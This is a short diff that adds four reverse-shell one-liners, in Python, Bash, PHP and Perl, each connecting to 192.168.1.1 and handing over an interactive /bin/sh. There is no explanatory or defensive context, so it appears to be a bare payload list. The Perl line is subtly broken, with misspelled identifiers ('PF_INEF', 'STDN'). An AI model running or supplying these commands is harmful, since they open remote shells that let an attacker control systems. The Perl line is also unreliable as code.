@@ -1,0 +1,4 @@
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.1",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+bash -i >& /dev/tcp/192.168.1.1/4444 0>&1
+php -r '$sock=fsockopen("192.168.1.1",2222);exec("/bin/sh -i <&3 >&3 2>&3");'
+perl -e 'use Socket;$i="192.168.1.1";$p=4444;socket(S,PF_INEF,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
